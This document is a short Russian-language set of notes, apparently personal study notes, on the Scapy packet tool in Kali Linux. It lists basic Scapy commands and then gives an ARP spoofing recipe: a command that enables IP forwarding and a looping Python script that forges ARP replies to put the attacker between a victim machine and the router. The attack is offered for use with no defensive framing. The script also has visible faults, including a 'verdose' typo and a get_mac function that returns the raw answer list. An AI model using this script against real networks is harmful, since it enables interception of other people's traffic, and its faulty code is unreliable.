***
Фреймвор, написанный на python, предустановлен в Kali. 
***
## Команды

**help() / help("func")** - помощь пайтона

**ls() / ls(протокол)** - поддерживаемые протоколы / их параметры
>**someVar = протокол()** - создаст пакет
**someVar1 = someVar2/someVar3** - склеит новый пакет из ранних
**someVar.display()** - проверить параметры и их значения
**send(someVar) / sendp(someVar)** - отправить в сеть пакет

dir() - предустановленные функции.

***
## ARP spoofing
1. Для атаки необходимо притвориться **для компьютера жертвы роутером, а для роутера - компьютером жертвы.**
2. Настроить свою систему под имитацию роутера:
	```bush
	echo 1 > /proc/sys/net/ipv4/ip_forward
	```
	
Простейший пример на python3:
```python
#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answer_list = scapy.srp(arp_request_broadcast, timeout=2, verdose=False)[0]
	
	return answer_list

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

sent_packets_count = 0
try:
	while True:
		spoof(<ip жертвы>, <ip роутура>)
		spoof(<ip роутура>, <ip жертвы>)
		sent_packets_count += 2
		print("\r[+] Packets sent: " + str(sent_packets_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[+] Detected CTRL + C ... Quitting.")
```